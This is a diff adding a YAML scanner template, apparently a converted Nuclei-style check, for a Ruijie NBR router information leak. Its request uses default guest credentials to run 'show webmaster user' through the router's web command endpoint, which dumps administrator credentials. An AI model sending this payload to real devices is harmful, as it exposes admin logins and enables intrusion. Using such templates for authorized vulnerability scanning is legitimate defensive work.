@@ -1,0 +1,24 @@
+id: yaml-poc-ruijie-nbr-leak-CT-158549
+info:
+  name: Yaml Poc Ruijie Nbr Leak Ct 158549
+  author: converted
+  severity: low
+  description: 'Converted from xpoc: yaml-poc-ruijie-nbr-leak-CT-158549'
+  tags: xpoc
+  reference: []
+http:
+- method: POST
+  path:
+  - /WEB_VMS/LEVEL15/
+  body: 'command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
+
+    '
+  headers:
+    Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
+    Content-Type: application/x-www-form-urlencoded
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
